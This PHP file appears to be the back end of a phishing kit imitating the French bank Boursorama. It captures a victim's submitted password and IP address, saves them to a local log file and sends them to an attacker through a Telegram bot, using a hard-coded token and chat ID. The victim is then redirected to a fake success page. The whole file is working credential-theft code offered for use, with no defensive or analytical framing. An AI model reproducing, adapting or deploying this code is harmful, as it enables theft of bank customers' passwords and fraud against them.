<?php
ob_start();
session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(isset($_POST['ide_password'])){

$message  = "[+]━━━━【🏦 BOURSO / LOG + PASS 】━━━[+]\n";
$message .= "[🔒 Mot de passe]   : ".$_POST['ide_password']."\n";
$message .= "\n";
$message .= "[🔍 IP INFO]: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ Bourso  INFO]=========";
$fh = fopen('XXD.txt' ,'a');
fwrite($fh, ' '."".$message ."\n\n");
fclose($fh);
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:../../success.php");
}else{
header("Location:../../success.php");
}

?>